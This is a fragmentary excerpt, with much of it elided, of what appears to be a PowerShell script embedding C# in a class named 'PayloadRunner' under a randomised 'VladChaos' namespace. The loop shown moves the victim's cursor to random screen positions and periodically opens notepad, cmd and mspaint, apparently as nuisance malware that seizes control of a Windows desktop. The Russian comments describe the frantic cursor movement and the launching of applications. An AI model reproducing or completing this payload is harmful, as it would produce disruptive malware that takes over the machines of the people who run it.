...
$namespaceName = "VladChaos_$randId"
    ...
    public class PayloadRunner {
        ...
        public static void Run() {
            ...
            while (isRunning) {
                ...
                // Бешеное движение курсора
                SetCursorPos(r.Next(0, w), r.Next(0, h));

                // Открытие приложений и ввод нужного текста
                appTimer++;
                if (appTimer % 120 == 0) {
                    try {
                        string[] apps = { "notepad.exe", "cmd.exe", "mspaint.exe" };
